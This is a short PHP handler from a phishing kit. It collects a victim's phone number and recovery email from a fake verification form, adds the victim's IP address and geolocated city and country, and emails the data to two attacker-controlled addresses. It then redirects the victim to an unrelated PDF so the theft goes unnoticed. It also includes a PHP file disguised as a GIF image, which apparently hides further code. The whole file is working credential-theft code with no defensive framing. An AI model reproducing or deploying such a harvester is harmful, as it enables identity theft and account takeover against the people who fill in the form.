<?php

$ip = getenv("REMOTE_ADDR");
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
//get user's ip address 
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 

$msg = "------------------| Cogzy |--------------------\n";
$msg .= "Verification\n";
$msg .= "Phone: ".$_POST['phoneNumber']."\n";
$msg .= "Email Recovery: ".$_POST['emailAnswer']."\n";
$msg .= "IP: $ip\n";
$msg .= "--------------------------------------------------\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";

$send = "dlordmercy@yandex.com, gmoneyvault@hotmail.com";
$subject = "Others | $ip";
include_once "css/button.gif";
mail($send,$subject,$msg);
header('Location: https://www.capgemini.com/wp-content/uploads/2017/07/wealth_management_trends_2017_web_0.pdf');

?>